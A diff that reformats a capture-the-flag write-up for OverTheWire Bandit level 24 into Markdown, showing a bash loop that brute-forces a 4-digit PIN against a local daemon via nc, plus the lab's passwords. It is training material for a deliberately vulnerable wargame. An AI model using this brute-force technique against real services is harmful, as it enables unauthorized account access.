@@ -1,42 +1,54 @@
------------------------------------------------------------------------------------------------------------------
-"
-A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. 
-There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
-You do not need to create new connections each time
-"
------------------------------------------------------------------------------------------------------------------
+# Bandit Level 24
 
+> A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.  
+> You do not need to create new connections each time
 
-sshpass -f "sshpass" ssh bandit24@bandit.labs.overthewire.org -p 2220
+## Solution
 
-# first let's check what is the response
+```shell
+sshpass -f "ssh_pass" ssh bandit24@bandit.labs.overthewire.org -p 2220
+```
 
+**first let's check what is the response**
+
+```shell
 nc localhost 30002
+```
 
->> I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+```text
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
 
 gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 0000
 
->> Wrong! Please enter the correct current password and pincode. Try again.
+Wrong! Please enter the correct current password and pincode. Try again.
+```
 
-# so we need to make a script that loop all the combinations
+**so we need to make a script that loop all the combinations**
 
+```shell
 mkdir /tmp/my_temp/
+```
 
+```shell
 nano /tmp/my_temp/brute_bash.sh
+```
 
->> ---
+```shell
 for i in {0000..9999}
 do
         echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i"
 done
->> ---
+>> 
+```
 
+```shell
 chmod +x /tmp/my_temp/brute_bash.sh
-
 /tmp/my_temp/brute_bash.sh > /tmp/my_temp/dict_brute.txt
-
 nc localhost 30002 < /tmp/my_temp/dict_brute.txt | grep -v "Wrong!"
+```
 
->> Correct!
->> The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
+```text
+Correct!
+The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
+```
+
